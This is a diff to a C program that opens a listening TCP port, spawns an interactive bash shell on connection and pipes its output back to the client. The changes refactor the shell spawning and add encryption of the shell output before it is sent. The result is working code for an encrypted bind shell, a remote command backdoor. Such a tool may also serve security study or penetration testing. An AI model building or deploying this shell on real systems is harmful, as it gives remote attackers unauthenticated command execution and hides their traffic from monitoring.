@@ -8,7 +8,7 @@
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
-#include "crypto.c"
+#include "crypto.h"
 #define NUM_PIPES          2
 
 #define PARENT_WRITE_PIPE  0
@@ -39,27 +39,44 @@ void hex (unsigned char *p, size_t n){
     printf("%02x", *p++);
   }
 }
-int main(int argc, char *argv[]) {
-  // Network stuff
-  int sockfd, newsockfd, portno, n;
 
-  socklen_t clilen;
-  char sock_buffer[1024];
+void run_bash_process() {
+  char *argv[]={ "/bin/bash", "-i", 0};
 
-  struct sockaddr_in serv_addr, cli_addr;
-  sockfd = socket(AF_INET, SOCK_STREAM, 0);
+  dup2(CHILD_READ_FD, STDIN_FILENO);
+  dup2(CHILD_WRITE_FD, STDOUT_FILENO);
+  dup2(CHILD_WRITE_FD, STDERR_FILENO);
+
+  execv(argv[0], argv);
+}
+
+int listen_on_socket(int portno) {
+  struct sockaddr_in serv_addr;
+
+  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
   bzero((char *) &serv_addr, sizeof(serv_addr));
-  portno =  atoi(argv[1]);
-
   serv_addr.sin_family = AF_INET;
   serv_addr.sin_port = htons(portno);
   serv_addr.sin_addr.s_addr = INADDR_ANY;
-
   if (bind(sockfd, (struct sockaddr *) &serv_addr,
            sizeof(serv_addr)) < 0)
                error("ERROR on binding");
 
   listen(sockfd,5);
+  return sockfd;
+}
+
+
+int main(int argc, char *argv[]) {
+  // Network stuff
+  int sockfd, newsockfd, portno, n;
+
+  portno =  atoi(argv[1]);
+  socklen_t clilen;
+  char sock_buffer[1024];
+
+  struct sockaddr_in cli_addr;
+  sockfd = listen_on_socket(portno);
 
   printf("Waiting for connections on port: %d \n", portno);
   newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
@@ -102,16 +119,11 @@ int main(int argc, char *argv[]) {
   pid_t procId = fork();
 
   if (procId == 0 ) {
-    char *argv[]={ "/bin/bash", "-i", 0};
-
-    dup2(CHILD_READ_FD, STDIN_FILENO);
-    dup2(CHILD_WRITE_FD, STDOUT_FILENO);
-    dup2(CHILD_WRITE_FD, STDERR_FILENO);
-
-    execv(argv[0], argv);
+    // Child proess
+    run_bash_process();
   } else if (procId > 0) {
-    char bash_buffer[10000];
-    int file_listing;
+    char bash_buffer[1024];
+    int bytes_read;
     /* close fds not required by parent */
     close(CHILD_READ_FD);
     close(CHILD_WRITE_FD);
@@ -132,10 +144,16 @@ int main(int argc, char *argv[]) {
       } else if (retval) {
         if(FD_ISSET(PARENT_READ_FD, &rfds)) {
             // data is available from bash
-            bzero(bash_buffer, 10000);
-            file_listing = read(PARENT_READ_FD, bash_buffer, sizeof(bash_buffer)-1);
-            if (file_listing >= 0) {
-              send(newsockfd, bash_buffer,strlen(bash_buffer), 0);
+            bzero(bash_buffer, 1024);
+            bzero(sock_buffer, 1024);
+            bytes_read = read(PARENT_READ_FD, bash_buffer, sizeof(bash_buffer)-1);
+            if (bytes_read >= 0) {
+              int cipher_length;
+              cipher_length = encrypt_data((unsigned char *)bash_buffer, strlen(bash_buffer), secret_key, iv, (unsigned char *)sock_buffer);
+              printf("cipher_length: %d\n", cipher_length);
+
+              send(newsockfd, &cipher_length,4, 0);
+              send(newsockfd, sock_buffer, cipher_length, 0);
             }
         } else {
           // data is available on socket
